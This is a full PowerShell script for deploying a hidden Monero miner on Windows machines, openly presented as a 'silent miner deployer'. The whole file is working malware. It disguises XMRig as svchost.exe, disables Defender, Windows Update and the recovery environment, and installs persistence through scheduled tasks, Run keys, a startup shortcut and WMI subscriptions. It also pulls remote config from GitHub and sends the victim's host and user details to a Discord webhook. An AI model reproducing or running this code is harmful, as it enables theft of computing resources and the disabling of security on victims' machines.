# ============================================================
#  XMR Silent Miner Deployer v3 (ULTRA HARDENED + SILENT FIX)
#  - Pulls config from PUBLIC GitHub repo
#  - Dynamic idle/active CPU throttle
#  - Survives reboots (schtasks + registry + startup folder)
#  - HARDENED: WinRE Disabled + Updates Blocked
# ============================================================

# ==================== CONFIG ====================
$ghOwner = "itzcurled"
$ghRepo = "dogman"
$ghConfigPath = "config.json"

# Fallback values
$wallet = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
$pool = "pool.hashvault.pro:443"
$poolBak = "pool.supportxmr.com:443"
$idleCpu = 90
$activeCpu = 40
$idleThreshold = 75

$installDir = "$env:APPDATA\WindowsServices"
$xmrigExe = "$installDir\svchost.exe"
$configFile = "$installDir\config.json"
$watchdogPs1 = "$installDir\watchdog.ps1"
$watchdogVbs = "$installDir\monitor.vbs"
$xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
$zipFile = "$env:TEMP\winsvc.zip"
$extractDir = "$env:TEMP\winsvc_extract"
$xmrigApiPort = 45580
$rigId = "$env:COMPUTERNAME"
$worker = "$env:COMPUTERNAME"

# ==================== FUNCTIONS ====================

function Disable-WindowsHardening {
    # ── 1. Disable Windows Recovery Environment (WinRE) ──
    # [FIXED] Using native redirection for 100% silence in CMD
    try {
        & reagentc.exe /disable >$null 2>$null
    } catch {}

    # ── 2. Block Reset Page in Settings UI ──
    try {
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        if (!(Test-Path $regPath)) { New-Item $regPath -Force | Out-Null }
        Set-ItemProperty -Path $regPath -Name "NoRecoveryPage" -Value 1 -Force -ErrorAction SilentlyContinue
    } catch {}

    # ── 3. Kill & Disable Windows Update Services ──
    try {
        $services = @("wuauserv", "bits", "dosvc")
        foreach ($svc in $services) {
            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
            Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
        }
    } catch {}
}

function Install-Miner {
    # Aggressively kill existing miner and watchdog processes
    try {
        Get-CimInstance Win32_Process -ErrorAction Stop | Where-Object { 
            ($_.ExecutablePath -like "*WindowsServices*") -or 
            ($_.CommandLine -like "*monitor.vbs*") -or 
            ($_.CommandLine -like "*watchdog.ps1*")
        } | ForEach-Object {
            Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
        }
    }
    catch {
        # Fallback if WMI is broken or out of memory
        Get-Process -Name "svchost", "wscript" -ErrorAction SilentlyContinue | Where-Object {
            ($_.Path -like "*WindowsServices*") -or ($_.CommandLine -like "*monitor.vbs*") -or ($_.CommandLine -like "*watchdog.ps1*")
        } | Stop-Process -Force -ErrorAction SilentlyContinue
    }
    
    # Absolute brute force fallback for locked files
    try {
        taskkill /F /IM wscript.exe /T 2>$null
        $lockedProcs = Get-Process | Where-Object { $_.Path -like "*WindowsServices\svchost.exe*" }
        foreach ($p in $lockedProcs) {
            Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
            taskkill /F /PID $($p.Id) /T 2>$null
        }
    }
    catch {}
    
    # Wait a moment to ensure file locks are released
    Start-Sleep -Seconds 3

    New-Item -ItemType Directory -Path $installDir -Force | Out-Null

    # Force all modern TLS protocols
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
    }
    catch {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    }

    # Download with retry: WebClient -> Invoke-WebRequest -> BitsTransfer
    $downloaded = $false

    # Method 1: WebClient
    if (-not $downloaded) {
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "Mozilla/5.0")
            $wc.DownloadFile($xmrigUrl, $zipFile)
            $downloaded = $true
        }
        catch {}
    }

    # Method 2: Invoke-WebRequest
    if (-not $downloaded) {
        try {
            Invoke-WebRequest -Uri $xmrigUrl -OutFile $zipFile -UseBasicParsing -ErrorAction Stop
            $downloaded = $true
        }
        catch {}
    }

    # Method 3: BitsTransfer
    if (-not $downloaded) {
        try {
            Import-Module BitsTransfer -ErrorAction SilentlyContinue
            Start-BitsTransfer -Source $xmrigUrl -Destination $zipFile -ErrorAction Stop
            $downloaded = $true
        }
        catch {}
    }

    if (-not $downloaded) { throw "All download methods failed" }

    if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force }

    # Try to disable Defender real-time protection before extraction
    try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop } catch {}

    Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force

    # Race Defender: find and copy xmrig.exe immediately, retry up to 3 times
    $copied = $false
    for ($attempt = 1; $attempt -le 3; $attempt++) {
        $srcExe = Get-ChildItem -Path $extractDir -Filter "xmrig.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($srcExe -and (Test-Path $srcExe.FullName)) {
            try {
                Copy-Item -Path $srcExe.FullName -Destination $xmrigExe -Force -ErrorAction Stop
                $copied = $true
                break
            } catch {}
        }
        # If Defender ate it, re-extract and try again
        if ($attempt -lt 3) {
            Start-Sleep -Seconds 2
            try { Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force } catch {}
        }
    }

    # Re-enable Defender
    try { Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue } catch {}

    if (-not $copied) { throw "xmrig.exe not found in archive (likely deleted by antivirus)" }

    Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
    Remove-Item $extractDir -Recurse -Force -ErrorAction SilentlyContinue
}

function Write-MinerConfig {
    param([int]$CpuPercent = $idleCpu)
    $cfg = @{
        autosave       = $false
        cpu            = @{
            "max-threads-hint" = $CpuPercent
            priority           = 2
            "huge-pages"       = $true
            "huge-pages-jit"   = $true
            "hw-aes"           = $null
            "asm"              = $true
            "yield"            = $false
            "memory-pool"      = $true
            "argon2-impl"      = $null
        }
        opencl         = $false
        cuda           = $false
        pools          = @(
            @{ url = "stratum+ssl://${pool}"; user = $wallet; pass = $worker; "rig-id" = $rigId; keepalive = $true; tls = $true },
            @{ url = "stratum+ssl://${poolBak}"; user = $wallet; pass = $worker; "rig-id" = $rigId; keepalive = $true; tls = $true }
        )
        "donate-level" = 0
        "background"   = $true
        "colors"       = $false
        "log-file"     = $null
        "print-time"   = 0
        "syslog"       = $false
        "http"         = @{ enabled = $true; host = "127.0.0.1"; port = $xmrigApiPort; "access-token" = $null; restricted = $false }
        "randomx"      = @{ "1gb-pages" = $true; wrmsr = $true; "numa" = $true; "init" = -1; "mode" = "auto"; "cache_qos" = $true }
    } | ConvertTo-Json -Depth 5
    Set-Content -Path $configFile -Value $cfg -Force
}

function Write-Watchdog {
    $code = @'

Add-Type @"
using System;
using System.Runtime.InteropServices;
public struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
public class IdleDetect {
    [DllImport("user32.dll")]
    public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    public static uint GetIdleSeconds() {
        LASTINPUTINFO lii = new LASTINPUTINFO();
        lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
        if (!GetLastInputInfo(ref lii)) return 0;
        return ((uint)Environment.TickCount - lii.dwTime) / 1000;
    }
}
"@

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$ghOwner        = "___GHOWNER___"
$ghRepo         = "___GHREPO___"
$ghConfigPath   = "___GHCONFIGPATH___"
$xmrigExe       = "___XMRIGEXE___"
$configFile     = "___CONFIGFILE___"
$xmrigApiPort   = ___APIPORT___
$rigId          = $env:COMPUTERNAME

$wallet         = "___WALLET___"
$pool           = "___POOL___"
$poolBak        = "___POOLBAK___"
$idleCpu        = ___IDLECPU___
$activeCpu      = ___ACTIVECPU___
$idleThreshold  = ___IDLETHRESHOLD___

$lastState      = ""
$configTimer    = [System.Diagnostics.Stopwatch]::StartNew()

function Fetch-GithubConfig {
    try {
        $url = "https://raw.githubusercontent.com/$ghOwner/$ghRepo/main/$ghConfigPath"
        $resp = Invoke-RestMethod -Uri $url -ErrorAction Stop
        return $resp
    } catch { return $null }
}

function Set-XmrigCpu {
    param([int]$Percent)
    try {
        $body = @{ "cpu" = @{ "max-threads-hint" = $Percent } } | ConvertTo-Json -Depth 3
        Invoke-RestMethod -Uri "http://127.0.0.1:${xmrigApiPort}/2/config" -Method PUT -Body $body -ContentType "application/json" -ErrorAction Stop | Out-Null
    } catch {}
}

function Ensure-MinerRunning {
    $proc = Get-Process -Name "svchost" -ErrorAction SilentlyContinue |
        Where-Object { $_.Path -like "*WindowsServices*" }
    if (-not $proc) {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $xmrigExe
        $psi.Arguments = "--config=`"$configFile`""
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.CreateNoWindow = $true
        $psi.UseShellExecute = $false
        [System.Diagnostics.Process]::Start($psi) | Out-Null
        Start-Sleep -Seconds 4
    }
}

function Apply-Config {
    param($cfg)
    if (-not $cfg) { return }

    if ($cfg.killSwitch -eq $true) {
        Get-Process -Name "svchost" -ErrorAction SilentlyContinue |
            Where-Object { $_.Path -like "*WindowsServices*" } |
            Stop-Process -Force -ErrorAction SilentlyContinue
        return
    }

    if ($cfg.wallet)        { $script:wallet = $cfg.wallet }
    if ($cfg.pool)          { $script:pool = $cfg.pool }
    if ($cfg.poolBackup)    { $script:poolBak = $cfg.poolBackup }
    if ($cfg.idleCpu)       { $script:idleCpu = [int]$cfg.idleCpu }
    if ($cfg.activeCpu)     { $script:activeCpu = [int]$cfg.activeCpu }
    if ($cfg.idleThreshold) { $script:idleThreshold = [int]$cfg.idleThreshold }

    if ($cfg.paused -eq $true) {
        try { Invoke-RestMethod -Uri "http://127.0.0.1:${xmrigApiPort}/2/pause" -Method POST -ErrorAction Stop | Out-Null } catch {}
        return
    }

    Ensure-MinerRunning
}

$persistTimer = [System.Diagnostics.Stopwatch]::StartNew()

function Repair-Persistence {
    $taskName = "WindowsServiceUpdate"
    $wdTask = "WindowsServiceMonitor"
    $vbsPath = ($xmrigExe -replace '[^\\]+$', '') + "monitor.vbs"
    $cfgPath = $configFile

    try {
        $t1 = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        if (-not $t1) {
            $a = New-ScheduledTaskAction -Execute $xmrigExe -Argument "--config=`"$cfgPath`""
            $tr = New-ScheduledTaskTrigger -AtLogon
            Register-ScheduledTask -TaskName $taskName -Action $a -Trigger $tr -Force 2>$null | Out-Null
        }
    } catch {}

    try {
        $t2 = Get-ScheduledTask -TaskName $wdTask -ErrorAction SilentlyContinue
        if (-not $t2) {
            $a2 = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsPath`""
            $tr2 = New-ScheduledTaskTrigger -AtLogon
            Register-ScheduledTask -TaskName $wdTask -Action $a2 -Trigger $tr2 -Force 2>$null | Out-Null
        }
    } catch {}

    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $val = Get-ItemProperty -Path $regPath -Name "WindowsServiceUpdate" -ErrorAction SilentlyContinue
        if (-not $val) {
            Set-ItemProperty -Path $regPath -Name "WindowsServiceUpdate" -Value "`"$xmrigExe`" --config=`"$cfgPath`"" -Force
        }
        $val2 = Get-ItemProperty -Path $regPath -Name "WindowsServiceMonitor" -ErrorAction SilentlyContinue
        if (-not $val2) {
            Set-ItemProperty -Path $regPath -Name "WindowsServiceMonitor" -Value "wscript.exe `"$vbsPath`"" -Force
        }
    } catch {}
}

Ensure-MinerRunning

while ($true) {
    try {
        $idleSecs = [IdleDetect]::GetIdleSeconds()
        $isIdle = $idleSecs -ge $idleThreshold
        $targetCpu = if ($isIdle) { $idleCpu } else { $activeCpu }
        $state = if ($isIdle) { "idle" } else { "active" }

        if ($state -ne $lastState) {
            Set-XmrigCpu -Percent $targetCpu
            $lastState = $state
        }

        # Pull config from GitHub every 30 minutes
        if ($configTimer.Elapsed.TotalSeconds -ge 1800) {
            $cfg = Fetch-GithubConfig
            Apply-Config -cfg $cfg
            $configTimer.Restart()
        }

        if ($persistTimer.Elapsed.TotalSeconds -ge 1800) {
            Repair-Persistence
            $persistTimer.Restart()
        }

        Ensure-MinerRunning
    } catch {}

    Start-Sleep -Seconds 5
}
'@

    $code = $code -replace '___GHOWNER___', $ghOwner
    $code = $code -replace '___GHREPO___', $ghRepo
    $code = $code -replace '___GHCONFIGPATH___', $ghConfigPath
    $code = $code -replace '___XMRIGEXE___', $xmrigExe
    $code = $code -replace '___CONFIGFILE___', $configFile
    $code = $code -replace '___APIPORT___', $xmrigApiPort.ToString()
    $code = $code -replace '___WALLET___', $wallet
    $code = $code -replace '___POOL___', $pool
    $code = $code -replace '___POOLBAK___', $poolBak
    $code = $code -replace '___IDLECPU___', $idleCpu.ToString()
    $code = $code -replace '___ACTIVECPU___', $activeCpu.ToString()
    $code = $code -replace '___IDLETHRESHOLD___', $idleThreshold.ToString()

    Set-Content -Path $watchdogPs1 -Value $code -Force
}

function Write-VbsLauncher {
    $vbs = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$watchdogPs1""", 0, False
"@
    Set-Content -Path $watchdogVbs -Value $vbs -Force
}

function Set-Persistence {
    $taskName = "WindowsServiceUpdate"
    try { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
    try {
        $action1 = New-ScheduledTaskAction -Execute $xmrigExe -Argument "--config=`"$configFile`""
        $trigStartup = New-ScheduledTaskTrigger -AtStartup
        $trigLogon = New-ScheduledTaskTrigger -AtLogon
        Register-ScheduledTask -TaskName $taskName -Action $action1 -Trigger @($trigStartup, $trigLogon) -RunLevel Highest -Force | Out-Null
    }
    catch {
        try {
            $action1 = New-ScheduledTaskAction -Execute $xmrigExe -Argument "--config=`"$configFile`""
            $trigLogon = New-ScheduledTaskTrigger -AtLogon
            Register-ScheduledTask -TaskName $taskName -Action $action1 -Trigger $trigLogon -Force | Out-Null
        } catch {}
    }

    $wdTask = "WindowsServiceMonitor"
    try { Unregister-ScheduledTask -TaskName $wdTask -Confirm:$false -ErrorAction SilentlyContinue } catch {}
    try {
        $action2 = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$watchdogVbs`""
        $trigStartup2 = New-ScheduledTaskTrigger -AtStartup
        $trigLogon2 = New-ScheduledTaskTrigger -AtLogon
        Register-ScheduledTask -TaskName $wdTask -Action $action2 -Trigger @($trigStartup2, $trigLogon2) -RunLevel Highest -Force | Out-Null
    }
    catch {
        try {
            $action2 = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$watchdogVbs`""
            $trigLogon2 = New-ScheduledTaskTrigger -AtLogon
            Register-ScheduledTask -TaskName $wdTask -Action $action2 -Trigger $trigLogon2 -Force | Out-Null
        } catch {}
    }

    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    try {
        Set-ItemProperty -Path $regPath -Name "WindowsServiceUpdate" -Value "`"$xmrigExe`" --config=`"$configFile`"" -Force
        Set-ItemProperty -Path $regPath -Name "WindowsServiceMonitor" -Value "wscript.exe `"$watchdogVbs`"" -Force
    } catch {}

    try {
        $regPathLM = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPathLM -Name "WindowsServiceUpdate" -Value "`"$xmrigExe`" --config=`"$configFile`"" -Force -ErrorAction Stop
        Set-ItemProperty -Path $regPathLM -Name "WindowsServiceMonitor" -Value "wscript.exe `"$watchdogVbs`"" -Force -ErrorAction Stop
    } catch {}

    $startupDir = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
    $lnkPath = "$startupDir\ServiceMonitor.lnk"
    try {
        $ws = New-Object -ComObject WScript.Shell
        $sc = $ws.CreateShortcut($lnkPath)
        $sc.TargetPath = "wscript.exe"
        $sc.Arguments = "`"$watchdogVbs`""
        $sc.WindowStyle = 7
        $sc.Description = "Windows Service Monitor"
        $sc.Save()
    }
    catch {}

    try {
        $filterName = "WindowsServiceMonitorFilter"
        $consumerName = "WindowsServiceMonitorConsumer"

        Get-WMIObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$filterName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$consumerName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object { $_.Filter -match $filterName } | Remove-WmiObject -ErrorAction SilentlyContinue

        $timerName = "WindowsServiceTimer"
        try { Get-WMIObject -Namespace root\cimv2 -Class __IntervalTimerInstruction -Filter "TimerID='$timerName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue } catch {}
        Set-WmiInstance -Namespace root\cimv2 -Class __IntervalTimerInstruction -Arguments @{
            TimerID = $timerName
            IntervalBetweenEvents = 300000 
        } -ErrorAction Stop | Out-Null

        $query = "SELECT * FROM __TimerEvent WHERE TimerID = '$timerName'"
        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
            Name = $filterName
            EventNameSpace = 'root\cimv2'
            QueryLanguage = 'WQL'
            Query = $query
        } -ErrorAction Stop

        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
            Name = $consumerName
            CommandLineTemplate = "wscript.exe `"$watchdogVbs`""
        } -ErrorAction Stop

        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
            Filter = $filter
            Consumer = $consumer
        } -ErrorAction Stop | Out-Null
    }
    catch {}

    try {
        $dirInfo = Get-Item $installDir -Force
        $dirInfo.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
    } catch {}
}

function Start-Miner {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $xmrigExe
    $psi.Arguments = "--config=`"$configFile`""
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.CreateNoWindow = $true
    $psi.UseShellExecute = $false
    [System.Diagnostics.Process]::Start($psi) | Out-Null
}

function Start-Watchdog {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "wscript.exe"
    $psi.Arguments = "`"$watchdogVbs`""
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.CreateNoWindow = $true
    $psi.UseShellExecute = $false
    [System.Diagnostics.Process]::Start($psi) | Out-Null
}

function Add-Exclusion {
    try {
        Add-MpPreference -ExclusionPath $installDir -ErrorAction Stop
        Add-MpPreference -ExclusionProcess "svchost.exe" -ErrorAction Stop
        Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction Stop
    }
    catch {}
}

function Enable-HugePages {
    try {
        $tmpCfg = "$env:TEMP\secpol.cfg"; $tmpDb = "$env:TEMP\secpol.sdb"
        secedit /export /cfg $tmpCfg /quiet 2>$null
        $content = Get-Content $tmpCfg -Raw
        $sid = (New-Object System.Security.Principal.NTAccount($env:USERNAME)).Translate([System.Security.Principal.SecurityIdentifier]).Value
        if ($content -match 'SeLockMemoryPrivilege\s*=\s*(.*)') {
            $existing = $Matches[1]
            if ($existing -notlike "*$sid*") { $content = $content -replace "(SeLockMemoryPrivilege\s*=\s*)(.*)", "`$1`$2,*$sid" }
        } else { $content = $content -replace "(\[Privilege Rights\])", "`$1`r`nSeLockMemoryPrivilege = *$sid" }
        Set-Content -Path $tmpCfg -Value $content -Force
        secedit /configure /db $tmpDb /cfg $tmpCfg /quiet 2>$null
        Remove-Item $tmpCfg, $tmpDb -Force -ErrorAction SilentlyContinue
    }
    catch {}
}

function Send-DiscordWebhook {
    $webhookUrl = "https://discord.com/api/webhooks/1506387263402278992/f3X-mX_mjq74YCqpZYNB2WH4hEg6NZj8LY6lPstCCtz31kJwthqkxXF580E187PnZI2a"
    try {
        $osName = "Unknown"
        try { $osName = (Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption } catch {
            try { $osName = [System.Environment]::OSVersion.VersionString } catch {}
        }
        $payload = @{
            username = "SOINION"
            avatar_url = "https://i.imgur.com/4M34hiw.png"
            embeds = @(@{
                    title = "New Miner Deployed!"
                    color = 3447003
                    fields = @(@{ name = "Host"; value = "$env:COMPUTERNAME"; inline = $true }, @{ name = "User"; value = "$env:USERNAME"; inline = $true }, @{ name = "OS"; value = "$osName"; inline = $false })
                    footer = @{ text = "Deploy script executed successfully" }
                    timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
            })
        } | ConvertTo-Json -Depth 5
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

function Disable-Sleep {
    try {
        powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c 2>$null
        powercfg /change standby-timeout-ac 0; powercfg /change standby-timeout-dc 0
        powercfg /change hibernate-timeout-ac 0; powercfg /change hibernate-timeout-dc 0
        powercfg /hibernate off 2>$null
    } catch {}
}

# ==================== MAIN ====================
try {
    Add-Exclusion
    Disable-WindowsHardening  # <── LOCKDOWN ENGAGED
    Disable-Sleep
    Enable-HugePages
    Install-Miner
    Write-MinerConfig -CpuPercent $idleCpu
    Write-Watchdog
    Write-VbsLauncher
    Set-Persistence
    Start-Miner
    Start-Sleep -Seconds 4
    Start-Watchdog
    Send-DiscordWebhook
    [Console]::WriteLine("[+] Miner + Watchdog deployed — $rigId pulling config from github.com/$ghOwner/$ghRepo")
}
catch {
    [Console]::WriteLine("[-] Deployment failed: $_")
}
